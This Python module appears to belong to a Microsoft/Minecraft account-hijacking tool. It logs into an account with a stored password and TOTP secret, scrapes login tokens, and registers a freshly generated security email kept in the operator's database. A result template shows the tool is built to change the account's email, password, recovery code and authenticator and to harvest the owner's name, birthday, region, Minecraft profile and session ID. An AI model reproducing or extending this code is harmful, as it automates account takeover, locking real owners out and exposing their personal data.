from views.utils.buildAccountData import buildAccountData
from views.utils.handleRedirects import handleRedirects
from views.utils.securing.generateEmail import generateEmail
from views.utils.securing.getLiveData import getLiveData
from views.utils.securing.loginPWD import loginPWD
from views.utils.initialSession import getSession
from views.utils.securing.secure import secure
from cogs.utils.genTOTP import totp

from database.database import DBConnection
from time import time
import httpx
import uuid
import re

async def loginAuth(session: httpx.AsyncClient, email: str, data: dict, account: dict):
    initialTime = time()
    
    secret = data["auth_secret"]
    password = data["password"]

    live_data = await getLiveData(session)
    pwd_login = await loginPWD(
        session,
        email,
        live_data["urlPost"],
        password,
        live_data["ppft"]
    )

    sFT = re.search(r'"sFT":"([^"]+)"', pwd_login).group(1)
    post_url: str = re.search(r'"urlPost":"(https://[^"]+)"', pwd_login).group(1)
    proof_data: str = re.search(r'"arrUserProofs":\[.*?"data":"(\d+)".*?"type":(?:10|14)', pwd_login, re.DOTALL).group(1)

    auth_post = await session.post(
        url = post_url,
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data = {
            "otc": totp(secret),
            "AddTD": "true",
            "SentProofIDE": proof_data,
            "GeneralVerify": "false",
            "PPFT": sFT,
            "canary": "",
            "sacxt": "1",
            "hpgrequestid": "",
            "hideSmsInMfaProofs": "false",
            "type": "19",
            "login": email,
            "infoPageShown": "0"
        }
    )

    urlPost = re.search(r'"urlPost"\s*:\s*"([^\"]+)"', auth_post.text)
    if urlPost:
        return None

    msaauth = await handleRedirects(session, auth_post.text)
    if not msaauth:
        return None

    dsecured = await secure(session, True, account)
    final_time = (time() - initialTime)
    build_account = await buildAccountData(dsecured, final_time)
    return build_account
            
async def recoverySecure(email: str, type: str, data: dict) -> dict:

    session = getSession()

    account = {
        "microsoft": {
            "email": "Couldn't Change!",
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": "Couldn't Change!",
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get"
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False
        }
    }

    sname = uuid.uuid4().hex[:16]
    password = uuid.uuid4().hex[:12]

    type, security_email = await generateEmail(sname, password)
    print(f"[+] - Generated Security Email ({security_email})")

    with DBConnection() as database:
        database.addSecurityEmail(security_email, password)

    print("[~] - Automaticly Securing Account...")
    match type:
        case "rcode":
            pass
        case "authpwd":
            account = await loginAuth(session, email, data, account)

    return account
            